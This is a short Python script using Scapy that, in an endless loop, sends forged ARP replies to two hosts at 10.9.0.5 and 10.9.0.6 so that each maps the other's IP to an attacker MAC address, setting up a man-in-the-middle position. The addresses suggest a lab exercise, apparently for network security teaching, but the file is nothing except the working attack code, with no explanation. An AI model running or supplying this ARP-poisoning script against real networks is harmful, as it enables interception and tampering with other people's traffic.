#!/usr/bin/env python3
from scapy.all import *
import time

A_IP = "10.9.0.5"
B_IP = "10.9.0.6"

A_MAC = "02:42:0a:09:00:05"
B_MAC = "02:42:0a:09:00:06"
M_MAC = "02:42:0a:09:00:69"

while True:
    # Poison A
    sendp(
        Ether(src=M_MAC, dst=A_MAC) /
        ARP(op=2, hwsrc=M_MAC, psrc=B_IP,
            hwdst=A_MAC, pdst=A_IP),
        verbose=False
    )

    # Poison B
    sendp(
        Ether(src=M_MAC, dst=B_MAC) /
        ARP(op=2, hwsrc=M_MAC, psrc=A_IP,
            hwdst=B_MAC, pdst=B_IP),
        verbose=False
    )

    print("ARP spoof packets sent")
    time.sleep(5)
